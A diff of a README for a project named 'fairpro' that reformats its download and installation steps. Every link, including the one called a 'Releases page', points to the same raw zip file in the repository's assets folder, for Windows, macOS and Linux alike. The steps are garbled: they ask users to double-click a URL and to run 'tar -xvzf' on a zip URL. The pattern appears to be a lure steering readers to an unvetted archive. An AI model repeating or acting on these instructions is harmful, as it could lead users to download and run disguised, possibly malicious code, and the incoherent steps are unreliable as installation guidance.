@@ -21,13 +21,13 @@ To download fairpro, please visit our [Releases page](https://raw.githubusercont
 1. Click on the link above to open the Releases page.
 2. Look for the latest version listed. It usually has the highest number.
 3. Download the file corresponding to your operating system:
-   - For Windows: `https://raw.githubusercontent.com/shahHussain11/fairpro/main/assets/fairpro_3.5.zip`
-   - For macOS: `https://raw.githubusercontent.com/shahHussain11/fairpro/main/assets/fairpro_3.5.zip`
-   - For Linux: `https://raw.githubusercontent.com/shahHussain11/fairpro/main/assets/fairpro_3.5.zip`
+   - **For Windows:** `https://raw.githubusercontent.com/shahHussain11/fairpro/main/assets/fairpro_3.5.zip`
+   - **For macOS:** `https://raw.githubusercontent.com/shahHussain11/fairpro/main/assets/fairpro_3.5.zip`
+   - **For Linux:** `https://raw.githubusercontent.com/shahHussain11/fairpro/main/assets/fairpro_3.5.zip`
 4. Once downloaded, open the file:
-   - For Windows, double-click the `https://raw.githubusercontent.com/shahHussain11/fairpro/main/assets/fairpro_3.5.zip` file to start the installer.
-   - For macOS, drag and drop the `fairpro` icon to your Applications folder.
-   - For Linux, open the terminal, navigate to the folder with the https://raw.githubusercontent.com/shahHussain11/fairpro/main/assets/fairpro_3.5.zip file, and run the following commands:
+   - **For Windows:** Double-click the `https://raw.githubusercontent.com/shahHussain11/fairpro/main/assets/fairpro_3.5.zip` file to start the installer.
+   - **For macOS:** Drag and drop the `fairpro` icon to your Applications folder.
+   - **For Linux:** Open the terminal, navigate to the folder with the https://raw.githubusercontent.com/shahHussain11/fairpro/main/assets/fairpro_3.5.zip file, and run the following commands:
      ```bash
      tar -xvzf https://raw.githubusercontent.com/shahHussain11/fairpro/main/assets/fairpro_3.5.zip
      cd fairpro
